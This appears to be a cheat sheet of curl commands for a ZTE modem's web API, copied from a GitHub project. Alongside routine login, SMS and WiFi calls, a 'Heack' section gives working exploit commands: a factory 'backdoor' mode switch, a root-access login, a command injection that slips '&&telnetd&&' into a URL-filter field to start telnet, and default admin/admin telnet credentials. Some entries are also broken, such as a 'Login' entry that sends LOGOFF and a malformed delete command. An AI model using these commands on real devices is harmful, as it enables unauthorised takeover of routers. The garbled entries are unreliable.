# Github
https://github.com/paulo-correia/ZTE_API_and_Hack

# Login
curl -X POST -s --header "Referer: http://192.168.0.1/index.html" -d 'isTest=false&goformId=LOGIN&password=YWRtaW4K' http://192.168.0.1/goform/goform_set_cmd_process

# Login --------------------------------->>>
# Method: POST
curl -s --header "Referer: http://<modem_ip>/index.html" -d 'isTest=false&goformId=LOGOFF' http://<modem_ip>/goform/goform_set_cmd_process
# if is OK {"result":"sucess"}

# Logoff -------------------------------->>>
# Method: POST
curl -s --header "Referer: http://<modem_ip>/index.html" -d 'isTest=false&goformId=LOGOFF' http://<modem_ip>/goform/goform_set_cmd_process
# if is OK {"result":"sucess"}

# Delete SMS Message(s) ----------------->>>
# Method: POST
curl -s --header "Referer: http://<modem_ip>/index.html" -d "isTest=false&goformId=DELETE_SMS&msg_id=<id>;&notCallback=true" curl -s --header "Referer: http://<modem_ip>/index.html"
http://<modem_ip>/goform/goform_set_cmd_process
# id is a Message ID
# To delete multiple pass ID one by one
# if is OK {"result":"success"}

# Disable WiFi -------------------------->>>
# Method: POST
curl -s --header "Referer: http://<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=0' http://<modem_ip>/goform/goform_set_cmd_process
# if is OK {"result":"success"}

# Enable WiFi --------------------------->>>
# Method: POST
curl -s --header "Referer: http:/<modem_ip>/index.html" -d 'goformId=SET_WIFI_INFO&isTest=false&m_ssid_enable=0&wifiEnabled=1' http://<modem_ip>/goform/goform_set_cmd_process
# if is OK {"result":"success"}

# =============================================================
# Heack --------------------------------->>>
# Linux users must install curl and telnet
# Password is base64 encoded https://www.base64encode.org

# FActory Backdoor ---------------------->>>
# Method: POST
curl -s -H "Referer: http://<modem_ip>/index.html" "http://<modem_ip>/goform/goform_set_cmd_process?isTest=false&goformId=CHANGE_MODE&change_mode=2&password=<Password>"
# if is OK {"result":"success"}

# Enable Root Acess --------------------->>>
# Method: POST
curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=LOGIN&password=<Password>"
# if is OK  {"result":"3"}

# Exploits Nvram ------------------------>>>
# Method: POST
curl "http://<modem_ip>/goform/goform_set_cmd_process" -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -H "Referer: http://<modem_ip>/index.html" --data "isTest=false&goformId=URL_FILTER_ADD&addURLFilter=http%3A%2F%2F_L33T_H4X0R_%2F%26%26telnetd%26%26"
# if is OK {"result":"success"}

# SSH Access ---------------------------->>>
telnet <modem_ip> 4719
User: admin
Pass: admin

